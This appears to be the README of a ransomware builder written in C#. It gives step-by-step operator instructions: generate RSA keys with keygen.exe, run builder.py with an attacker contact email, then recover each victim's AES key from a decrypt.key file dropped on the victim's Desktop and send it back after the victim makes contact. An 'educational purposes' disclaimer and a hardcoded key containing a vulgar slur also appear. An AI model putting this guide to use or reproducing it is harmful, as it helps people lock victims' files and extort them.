# blackhole-ransomware
blackhole is a ransomware coded in c#

Its only for educational purposes
I will not be responsible for anything.

KEY = rupamadarchodxxx$$$XXX!!!


                              __
                            .d$$b
                          .' TO$;\\
                         /  : TP._;
                        / _.;  :Tb|
                       /   /   ;j$j
                   _.-"       d$$$$
                 .' ..       d$$$$;
                /  /P'      d$$$$P. |\\
               /   "      .d$$$P' |\^"l
             .'           `T$P^"""""  :
         ._.'      _.'                ;
      `-.-".-'-' ._.       _.-"    .-"
    `.-" _____  ._              .-"
   -(.g$$$$$$$b.              .'
     ""^^T$$$P^)            .(:
       _/  -"  /.'         /:/;
    ._.'-'`-'  ")/         /;/;
 `-.-"..--""   " /         /  ;
.-" ..--""        -'          :
..--""--.-"         (\      .-(\\
  ..--""              `-\(\/;`
    _.                      :
                            ;`-
                           :\\
                           ;  blackhole-ransomware builder v0.1
````````````````````````````````````````````````````````````````````````````````  


How to generate ransomware
1. Run the keygen.exe and generate your RSA public and private key
2. Run the builder Enter the full path to the PUT_THIS_KEY_INSIDE_SOURCECODE.txt file 
(Example : python builder.py example@torbasedemail.com /root/1337/PUT_THIS_KEY_INSIDE_SOURCECODE.txt)
3. Enter your email address where the victim will contact you

DONE !!!

How to decrypt victims files
3. To decrypt the victim file, ask the decrypt.key file which dropped inside victims Desktop folder
4. This, decrypt.key file contains the AES key using keygen.exe run Key Generator choose option 2 enter victim decrypt.key file path enters your private key file path, and it will decrypt the decrypt.key file, and you will get the AES key. Now send it to your victim. 

Your victims can decrypt their files using this key every time this ransomware generates a new key, so every key will be different.
